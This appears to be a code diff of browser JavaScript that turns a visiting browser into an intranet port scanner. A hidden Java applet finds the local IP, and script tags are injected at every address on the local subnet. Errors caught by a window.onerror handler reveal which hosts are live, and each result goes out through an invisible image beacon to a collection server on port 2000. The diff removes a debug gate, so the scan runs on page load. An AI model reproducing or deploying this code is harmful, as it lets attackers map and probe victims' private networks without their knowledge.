@@ -8,10 +8,14 @@
 
 
 (function($){
+$(function(){
 
 
-function intranetPortScan(IP){
 
+
+
+function portScan(IP){
+	console.log(IP);
   var net = ip.substring(0,ip.lastIndexOf('.')+1);
 
 
@@ -29,7 +33,7 @@ function intranetPortScan(IP){
 
     if(y > end){ y = end;}
 
-    setTimeout("scan("+x+","+y+",'"+net+"')"),timeout);
+    setTimeout("document.scan("+x+","+y+",'"+net+"')",timeout);
     timeout+=6000;
 
     self.setTimeout("window.stop();",timeout);
@@ -57,44 +61,32 @@ function scan(start,end ,range){
         var URL = 'http://'+range+n+'/';
 
 
-        if(debug['portscan']){
+        //if(debug['portscan']){
 
           var script = document.createElement('script');
           script.src = URL;
 
           document.body.appendChild(script);
-        }
+	  document.body.removeChild(script);
+        //}
     }
   }
 
-  function err(msg ,loc, a ,b){
+window.onerror= function err(message,url,lineNumber){
+	
+	if(message.match(/Script error./)){
 
-
-      if(!msg.match(/Error loading script/)){
-
-        var Image = new Image();
-        var src = off_domain;//add stuff
-        img.src = src;
-      }
-      return;
-  }
-  
-}
-
-
-
-  }
-
-
-
+		$("body:first").append("<img width=0 height=0 src='http://192.168.1.192:2000/control/responds?host="+'"'+url+'"'+"'></img>");
+	}
 
 }
 
 
+document.pt = portScan;
+document.scan=scan;
+var pt = "function MyAddress(IP){ console.log(IP);document.pt(IP);}"
 
-$(function(){
-  portscan="function MyAddress(IP){intranetPortScan(IP)};"
-  $("body:first").append("<script>"+portscan+"</script>");
+$("head:first").append("<script>"+pt+"</script>");
 
 
   $("body:first").append("<APPLET code='MyAddress.class' MAYSCRIPT WIDTH=0 HEIGHT=0></APPLET>");
